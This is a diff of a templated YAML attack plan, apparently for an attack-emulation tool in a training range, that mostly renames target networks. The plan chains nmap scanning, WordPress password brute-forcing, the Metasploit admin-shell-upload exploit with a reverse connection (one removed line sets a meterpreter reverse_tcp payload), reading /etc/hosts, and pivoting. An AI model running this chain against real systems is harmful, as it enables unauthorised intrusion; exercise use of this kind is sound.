@@ -19,8 +19,8 @@ plan:
           arguments:
             module: mod_nmap
             module_arguments:
-              target: {{ networks.public.subnet }}
-              options: --exclude {{ networks.public.hosts.cryton_worker }} -sV --open
+              target: {{ networks.dmz.subnet }}
+              options: --exclude {{ networks.cryton.hosts.cryton_worker }} -sV --open
               ports:
                 - 80
                 - 3306
@@ -34,7 +34,7 @@ plan:
           arguments:
             module: mod_wpscan
             module_arguments:
-              target: {{ networks.public.hosts.wordpress }}
+              target: {{ networks.dmz.hosts.wordpress }}
 
     # Stage 1b
     - name: 1b-wordpress-exploitation
@@ -50,7 +50,7 @@ plan:
           arguments:
             module: mod_nmap
             module_arguments:
-              target: {{ networks.public.hosts.wordpress }}
+              target: {{ networks.dmz.hosts.wordpress }}
               options: --script http-wordpress-brute --script-args 'userdb=/app/resources/user_list.txt,passdb=/app/resources/pass_list.txt,http-wordpress-brute.threads=3,brute.firstonly=true'
           next:
             - type: result
@@ -66,12 +66,11 @@ plan:
               module_type: exploit
               module: unix/webapp/wp_admin_shell_upload
               module_options:
-                RHOSTS: {{ networks.public.hosts.wordpress }}
-                USERNAME: {{ machines.wordpress.wp_admin.username }} # TODO: $parent.{{ networks.public.hosts.wordpress }}.ports[0].scripts[0].data.Accounts.Children[0].username
-                PASSWORD: {{ machines.wordpress.wp_admin.password }} # TODO: $parent.{{ networks.public.hosts.wordpress }}.ports[0].scripts[0].data.Accounts.Children[0].password
-              payload: php/meterpreter/reverse_tcp
+                RHOSTS: {{ networks.dmz.hosts.wordpress }}
+                USERNAME: {{ machines.wordpress.wp_admin.username }}
+                PASSWORD: {{ machines.wordpress.wp_admin.password }}
               payload_options:
-                LHOST: {{ networks.public.hosts.cryton_worker }}
+                LHOST: {{ networks.cryton.hosts.cryton_worker }}
 
     # Stage 2a
     - name: 2a-server-net-information-gathering
@@ -91,7 +90,7 @@ plan:
               cmd: cat /etc/hosts
           next:
             - type: output
-              value: {{ networks.server_net.hosts.wordpress }}
+              value: {{ networks.dmz.hosts.wordpress }}
               step: create-route-to-server-net
 
         - name: create-route-to-server-net
